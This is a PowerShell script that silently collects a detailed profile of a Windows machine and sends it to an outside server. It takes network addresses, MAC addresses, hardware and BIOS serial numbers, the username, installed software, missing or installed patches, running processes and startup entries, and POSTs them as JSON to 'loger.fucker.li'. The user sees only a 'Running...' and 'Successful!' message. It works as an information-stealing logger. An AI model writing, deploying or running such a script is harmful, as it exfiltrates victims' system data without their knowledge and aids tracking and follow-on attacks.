$url = "https://loger.fucker.li"

Write-Host "Running..." -ForegroundColor Cyan

function Get-SafeCim {
    param([string]$ClassName)
    try { return Get-CimInstance -ClassName $ClassName -ErrorAction Stop } catch { return $null }
}

$publicIP = "Unknown"
$ipAPIs = @("https://api.ipify.org", "https://ifconfig.me/ip")
foreach ($api in $ipAPIs) {
    try {
        $publicIP = (Invoke-RestMethod -Uri $api -TimeoutSec 3).Trim()
        if ($publicIP -match '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}') { break }
    } catch { continue }
}

$os = Get-SafeCim Win32_OperatingSystem
$computerSystem = Get-SafeCim Win32_ComputerSystem
$bios = Get-SafeCim Win32_BIOS
$motherboard = Get-SafeCim Win32_BaseBoard

$cpu = Get-SafeCim Win32_Processor | Select-Object Name, NumberOfCores, NumberOfLogicalProcessors, MaxClockSpeed

$gpus = Get-SafeCim Win32_VideoController | ForEach-Object {
    @{ Name = $_.Name; DriverVersion = $_.DriverVersion; AdapterRAM_GB = [Math]::Round($_.AdapterRAM / 1GB, 2) }
}

$ramSlots = Get-SafeCim Win32_PhysicalMemory | ForEach-Object {
    @{ Slot = $_.DeviceLocator; Capacity_GB = [Math]::Round($_.Capacity / 1GB, 2); Speed_MHz = $_.Speed; Manufacturer = $_.Manufacturer.Trim() }
}

$physicalDisks = Get-SafeCim Win32_DiskDrive | ForEach-Object {
    @{ Model = $_.Model; Size_GB = [Math]::Round($_.Size / 1GB, 2); Interface = $_.InterfaceType; SerialNumber = $_.SerialNumber.Trim(); Status = $_.Status }
}

$logicalDisks = Get-SafeCim Win32_LogicalDisk | ForEach-Object {
    @{ DeviceID = $_.DeviceID; VolumeName = $_.VolumeName; Total_GB = [Math]::Round($_.Size / 1GB, 2); Free_GB = [Math]::Round($_.FreeSpace / 1GB, 2); DriveType = $_.DriveType }
}

$networkAdapters = Get-NetAdapter | Where-Object { $_.Status -eq "Up" } | ForEach-Object {
    $ipInfo = Get-NetIPAddress -InterfaceIndex $_.InterfaceIndex -AddressFamily IPv4
    @{ Name = $_.Name; Description = $_.InterfaceDescription; MacAddress = $_.MacAddress; LocalIPAddress = $ipInfo.IPAddress }
}
$monitors = Get-SafeCim Win32_DesktopMonitor | Select-Object Name, MonitorManufacturer, MonitorType

$uninstallPaths = @(
    "HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*",
    "HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*"
)
$installedApps = Get-ItemProperty $uninstallPaths -ErrorAction SilentlyContinue | 
    Where-Object { $_.DisplayName -and $_.SystemComponent -ne 1 } | 
    Select-Object DisplayName, DisplayVersion, Publisher | 
    Sort-Object DisplayName

$hotfixes = Get-SafeCim Win32_QuickFixEngineering | Select-Object HotFixID, InstalledOn, Description

$topProcesses = Get-Process | Sort-Object WorkingSet -Descending | Select-Object -First 20 | ForEach-Object {
    @{ ProcessName = $_.ProcessName; Id = $_.Id; Memory_MB = [Math]::Round($_.WorkingSet / 1MB, 2) }
}

$startupCommands = Get-SafeCim Win32_StartupCommand | Select-Object Name, Command, Location

$payload = [PSCustomObject]@{
    Meta = @{
        ComputerName   = $env:COMPUTERNAME
        Username       = $env:USERNAME
        ReportTime     = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
        UUID           = (Get-SafeCim Win32_ComputerSystemProduct).UUID
    }
    Network = @{
        Public_IP       = $publicIP
        NetworkAdapters = $networkAdapters
    }
    Hardware = @{
        BiosSerialNumber = $bios.SerialNumber.Trim()
        Motherboard     = @{ Manufacturer = $motherboard.Manufacturer; Product = $motherboard.Product }
        CPU             = $cpu
        GPUs            = $gpus
        RAM_Total_GB    = [Math]::Round($computerSystem.TotalPhysicalMemory / 1GB, 2)
        RAM_Slots       = $ramSlots
        PhysicalDisks   = $physicalDisks
        LogicalDisks    = $logicalDisks
        Monitors        = $monitors
    }
    System = @{
        OS_Caption      = $os.Caption
        OS_Version      = $os.Version
        OS_Architecture = $os.OSArchitecture
        BootDevice      = $os.BootDevice
        LastBootTime    = $os.LastBootUpTime
    }
    Environment = @{
        InstalledApps   = $installedApps
        Hotfixes        = $hotfixes
        TopProcesses    = $topProcesses
        StartupCommands = $startupCommands
    }
}

$jsonBody = ConvertTo-Json $payload -Depth 6
$utf8Bytes = [System.Text.Encoding]::UTF8.GetBytes($jsonBody)

try {
    [Net.ServicePointManager]::SecurityProtocol = 192 -bor 768 -bor 3072 -bor 12288
    $response = Invoke-RestMethod -Uri $url -Method Post -Body $utf8Bytes -ContentType "application/json; charset=utf-8"
    Write-Host "Successful!" -ForegroundColor Green
} catch {
    Write-Host "Error: $_" -ForegroundColor Red
}
